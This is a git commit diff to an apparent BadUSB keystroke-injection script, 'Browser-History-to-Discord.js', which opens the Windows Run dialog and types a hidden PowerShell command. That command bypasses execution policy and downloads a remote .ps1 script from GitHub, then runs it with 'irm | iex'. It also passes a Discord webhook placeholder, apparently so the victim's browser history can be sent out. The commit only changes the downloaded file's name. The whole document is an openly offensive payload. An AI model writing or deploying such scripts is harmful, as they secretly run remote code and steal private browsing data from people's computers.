abffabccde06aec58e154c77b778ae6fe810764a
egieb <93350544+beigeworm@users.noreply.github.com>
2023-12-28 00:33:31 +0000

    Update Browser-History-to-Discord.js

--- Fast-Execution-Scripts/Browser-History-to-Discord.js
+++ Fast-Execution-Scripts/Browser-History-to-Discord.js
@@ -7,6 +7,6 @@ layout("us")
 // Open Powershell as Admin
 press("GUI r");
 delay(1000);
-type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Brwsr-Hist.ps1 | iex");
+type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/brsr-hist.ps1 | iex");
 delay(500);
 press("ENTER");
